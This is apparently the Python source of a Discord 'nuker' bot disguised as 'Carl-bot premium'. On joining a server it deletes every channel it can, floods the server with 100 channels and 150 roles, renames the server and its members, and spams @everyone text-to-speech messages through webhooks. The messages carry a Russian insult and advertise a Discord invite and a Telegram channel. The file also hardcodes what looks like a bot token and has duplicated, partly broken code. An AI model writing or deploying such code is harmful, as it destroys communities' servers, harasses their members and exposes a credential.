import os
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import keep_alive
import discord
from discord.ext import commands
from discord import Permissions
import asyncio
import os
import discord, random, aiohttp, asyncio
from threading import Thread


SPAM_CHANNEL =  ["Crashed By 🎎Carl-bot premium🎎" , "Crashed By 🎎Carl-bot premium🎎" , "Crashed By 🎎Carl-bot premium🎎" , "Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎 ","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎","Crashed By 🎎Carl-bot premium🎎"]
SPAM_MESSAGE = ["@everyone @here Мы Вас Ебнули офицально от https://discord.gg/fzlgroup2 https://t.me/msk_cringe"] 

client = commands.Bot(command_prefix=".")
client.remove_command(name="help" )
@client.event
async def on_ready():
   print("Carl-bot Premium")
   await client.change_presence(activity=discord.Game(name="discord.gg/fzlgroup2"))


@client.event
async def on_guild_join(guild):
        with open('carl.png', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crashed By 🎎Carl-bot premium🎎", icon=icon)    


        for channel in guild.channels:
                try:
                        await channel.delete(reason="Crashed By 🎎Carl-bot premium🎎")
                except:
                        pass

        for _ in range(100):
            await guild.create_text_channel('Crashed By 🎎Carl-bot premium🎎')

        for _ in range(150):
          await guild.create_role(name='Crashed By 🎎Carl-bot premium🎎')    
        for member in guild.members:
           try:
             await member.edit(nick="Crashed By 🎎Carl-bot premium🎎")
           except:
             pass

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crashed By 🎎Carl-bot premium🎎")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(150):
        try:
          await webhook.send("@everyone @here Мы Вас Ебнули офицально от https://discord.gg/fzlgroup2 https://t.me/msk_cringe ", tts=True)
        except:
          break

@client.command()
async def on(ctx):
        with open('Protect++.png', 'rb') as f:
            icon = f.read()
        await guild.edit(name="Crashed By 🎎Carl-bot premium🎎", icon=icon)    


        for channel in guild.channels:
                try:
                        await channel.delete(reason="Crashed By 🎎Carl-bot premium🎎")
                except:
                        pass

        for _ in range(100):
            await guild.create_text_channel('Crashed By 🎎Carl-bot premium🎎')

        for _ in range(150):
          await guild.create_role(name='Crashed By 🎎Carl-bot premium🎎')    
        for member in guild.members:
           try:
             await member.edit(nick="Crashed By 🎎Carl-bot premium🎎")
           except:
             pass

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name = "Crashed By 🎎Carl-bot premium🎎")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      for i in range(150):
        try:
          await webhook.send("@everyone @here Мы Вас Ебнули офицально от https://discord.gg/fzlgroup2 https://t.me/msk_cringe", tts=True)
        except:
          break

TOKEN = 'OTY5OTk5MjAwODk5MTg2NzM4.Ym1kJw.PoLIdO5xTlmnxFwH--eqAMi9fjM'
client.run(TOKEN)
